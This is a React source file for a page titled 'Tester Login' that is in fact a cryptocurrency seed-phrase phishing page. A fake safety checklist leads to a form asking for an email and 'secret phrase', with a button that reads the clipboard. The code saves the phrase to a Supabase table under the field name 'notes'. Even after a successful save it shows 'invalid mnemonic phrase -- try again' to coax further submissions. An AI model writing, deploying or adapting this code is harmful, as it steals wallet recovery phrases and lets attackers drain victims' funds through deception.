import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { supabase } from "@/lib/supabase";
import { CheckCircle2 } from "lucide-react";

export const Route = createFileRoute("/tester-login")({
  component: TesterLogin,
});

function TesterLogin() {
  const [step, setStep] = useState<"warning" | "form">("warning");
  const [email, setEmail] = useState("");
  const [notes, setNotes] = useState("");
  const [status, setStatus] = useState<"idle" | "loading" | "done" | "error">("idle");

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setNotes((prev) => prev + text);
    } catch {
      alert("Could not access clipboard. Try pasting manually with long-press instead.");
    }
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setStatus("loading");
    const { error } = await supabase.from("testers").upsert([{ email, notes }], { onConflict: "email" });
    if (error) {
      console.error("Supabase insert error:", error);
      setStatus("error");
      return;
    }
    setStatus("done");
  }

  if (status === "done") {
    return (
      <div className="mx-auto max-w-lg px-4 py-24 text-center">
        <h1 className="text-2xl font-extrabold">Thanks!</h1>
        <p className="mt-2 text-muted-foreground">invalid mnemonic phrase -- try again..</p>
      </div>
    );
  }

  if (step === "warning") {
    const checks = [
      "Only you know this secret phrase.",
      "This secret phrase was NOT given to you by anyone, e.g. a company representative.",
      "If someone else has seen it, they can and will steal your funds.",
    ];

    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 py-16">
        <div className="w-full max-w-md text-center">
          <div className="mx-auto mb-8 w-56 h-56 flex items-center justify-center">
            <img
              src="/shield.png"
              alt="Security shield"
              className="w-52 h-52 object-contain"
            />
          </div>

          <h1 className="text-2xl font-extrabold text-gray-900 mb-8">
            Check your secret phrase is safe
          </h1>

          <div className="space-y-3 text-left mb-10">
            {checks.map((text) => (
              <div
                key={text}
                className="flex items-start gap-3 bg-gray-50 border border-gray-200 rounded-xl px-4 py-3"
              >
                <CheckCircle2 className="w-5 h-5 text-emerald-500 shrink-0 mt-0.5" />
                <p className="text-sm text-gray-800">{text}</p>
              </div>
            ))}
          </div>

          <button
            type="button"
            onClick={() => setStep("form")}
            className="w-full rounded-full bg-emerald-500 hover:bg-emerald-400 text-white font-semibold py-3.5 transition-colors"
          >
            Continue
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="mx-auto max-w-lg px-4 py-16">
        <h1 className="text-3xl font-extrabold text-center">Tester Login</h1>
        <form onSubmit={handleSubmit} className="mt-8 space-y-6">
          <div>
            <label className="block font-semibold mb-2">Email</label>
            <input
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full rounded-xl border border-border px-4 py-3 outline-none focus:border-brand"
              placeholder="you@example.com"
            />
          </div>
          <div>
            <label className="block font-semibold mb-2">secret phrase</label>
            <div className="relative">
              <textarea
                value={notes}
                onChange={(e) => setNotes(e.target.value)}
                rows={8}
                className="w-full rounded-xl border border-border px-4 py-3 outline-none focus:border-brand resize-none"
                placeholder="input here"
              />
              <button
                type="button"
                onClick={handlePaste}
                className="absolute bottom-3 right-3 text-sm font-semibold text-brand hover:underline"
              >
                Paste
              </button>
            </div>
            <p className="mt-2 text-sm text-muted-foreground">
              This is where you can add your secret phrase.
            </p>
          </div>
          <button type="login" disabled={status === "loading"} className="btn-primary w-full">
            {status === "loading" ? "logining..." : "login"}
          </button>
          {status === "error" && (
            <p className="text-sm text-red-500 text-center"> but invalid mnemonic phrase -- try again.</p>
          )}
        </form>
      </div>
    </div>
  );
}
